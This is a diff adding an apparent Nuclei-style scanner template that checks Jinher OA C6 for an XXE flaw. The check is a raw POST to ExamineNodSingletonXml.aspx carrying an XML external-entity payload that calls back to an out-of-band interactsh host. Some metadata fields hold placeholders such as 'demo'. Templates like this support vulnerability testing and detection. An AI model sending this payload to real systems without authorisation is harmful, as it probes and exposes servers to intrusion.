@@ -1,0 +1,40 @@
+id: jinher-oa-c6-ExamineNodSingletonXml-xxe
+info:
+  name: 金和OA_C6 ExamineNodSingletonXml存在XXE
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - demo
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: oob,jinher,xxe
+
+http:
+  - raw:
+      - |
+        POST /c6/Jhsoft.Web.examinenod/ExamineNodSingletonXml.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Content-Length: 139
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [
+        <!ENTITY % remote SYSTEM "http://{{interactsh-url}}">
+        %remote;]>
+        <root/>
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
